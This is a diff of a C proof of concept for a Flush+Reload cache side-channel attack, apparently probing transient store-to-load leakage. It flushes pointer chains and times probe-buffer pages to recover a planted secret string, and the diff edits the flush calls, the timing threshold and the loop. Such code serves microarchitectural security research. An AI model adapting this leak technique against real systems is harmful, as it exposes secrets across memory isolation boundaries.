@@ -5,12 +5,13 @@
 #include <stdio.h>
 #include <string.h>
 
-#define SECRET "F"
+#define SECRET "FOOBAR"
 char *probe_buf;
+char* data;
 size_t pagesize = 4096;
 int junk = 0;
 
-void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }
+//void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }
 
 // ---------------------------------------------------------------------------
 void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
@@ -22,12 +23,12 @@ int flush_reload_t(void *ptr) {
 
   end = __rdtscp(&junk);
   _mm_mfence();
-  flush(ptr);
+  _mm_clflush(ptr);
 
   return (int)(end - start);
 }
 
-void accessSTL(int x, char* data){
+void accessSTL(int x){
   // store secret in data
   strcpy(data, SECRET);
   
@@ -39,13 +40,13 @@ void accessSTL(int x, char* data){
   char*** data_slowslowptr = &data_slowptr;
   char**** data_ultraslowptr = &data_slowslowptr;
   _mm_mfence();
-  flush(&x);
-  flush(data_slowptr);
-  flush(&data_slowptr);
-  flush(data_slowslowptr);
-  flush(&data_slowslowptr);
-  flush(data_ultraslowptr);
-  flush(&data_ultraslowptr);
+  _mm_clflush(&x);
+  _mm_clflush(data_slowptr);
+  _mm_clflush(&data_slowptr);
+  _mm_clflush(data_slowslowptr);
+  _mm_clflush(&data_slowslowptr);
+  _mm_clflush(data_ultraslowptr);
+  _mm_clflush(&data_ultraslowptr);
   // ensure data is flushed at this point
   _mm_mfence();
   //_mm_sfence();
@@ -65,10 +66,11 @@ void accessSTL(int x, char* data){
 int main(){
     int j,k;
     int i = 0;
+    data = malloc(128);
     probe_buf = malloc(256 * pagesize);
+    memset(probe_buf,0,pagesize*256); // required for probe buffer to work properly
+    strcpy(data,SECRET);
     int hits[256];
-
-    char* target = malloc(2);
     int mix_i;
 
     for (i = 0; i < 256; i++) {
@@ -76,21 +78,21 @@ int main(){
     }
 
     
-    for (int tries = 19; tries > 0; tries--){
+    for (i = 0; i < 256; i++){
+        _mm_clflush(probe_buf + i*pagesize);
+    }
+    _mm_mfence();
+
+    for (int tries = 9; tries > 0; tries--){
         _mm_mfence();
 
-        for (i = 0; i < 256; i++){
-            _mm_clflush(probe_buf + i*pagesize);
-        }
-        _mm_mfence();
 
-
-        accessSTL(0, target);
+        accessSTL(0);
         _mm_mfence();
         
         for (i = 0; i < 256; i++) {
             mix_i = ((i * 167) + 13) & 255;
-            if (flush_reload_t(probe_buf + mix_i * pagesize) <= 80){
+            if (flush_reload_t(probe_buf + mix_i * pagesize) <= 120){
                 hits[mix_i]++;
             }
         }
@@ -113,6 +115,7 @@ int main(){
 
     printf("%d\n",junk);
     printf("j,hits[j]: %c,%d\n",j,hits[j]);
+    printf("k,hits[k]: %c,%d\n",k,hits[k]);
     free(probe_buf);
-    free(target);
+    free(data);
 }
